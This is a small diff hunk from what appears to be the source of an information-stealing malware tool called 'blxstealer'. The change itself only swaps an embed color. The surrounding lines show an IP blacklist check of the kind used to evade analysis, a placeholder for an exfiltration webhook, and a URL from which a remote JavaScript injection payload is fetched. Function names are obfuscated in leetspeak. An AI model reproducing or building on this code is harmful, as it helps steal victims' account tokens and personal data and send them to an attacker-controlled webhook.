@@ -52,7 +52,7 @@ if ip in sblacklist:
 
 h00k = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/index.js"
-color = 0x150f11
+color = 0x8B0000
 DETECTED = False
 
 def g371P():
